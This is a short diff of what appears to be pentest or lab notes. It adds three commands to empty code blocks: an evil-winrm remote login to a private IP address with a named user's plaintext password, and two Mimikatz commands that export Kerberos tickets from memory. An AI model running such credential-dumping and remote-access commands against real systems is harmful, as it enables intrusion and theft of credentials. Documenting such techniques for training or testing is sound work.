@@ -1,15 +1,15 @@
 [[Editing Copy Page]]
 
 ```
-
+evil-winrm -i 192.168.162.153 -u 'Eric.Wallows' -p 'EricLikesRunning800'
 ```
 
 ```
-
+sekurlsa::tickets /export
 ```
 
 ```
-
+kerberos::list /export
 ```
 
 ```
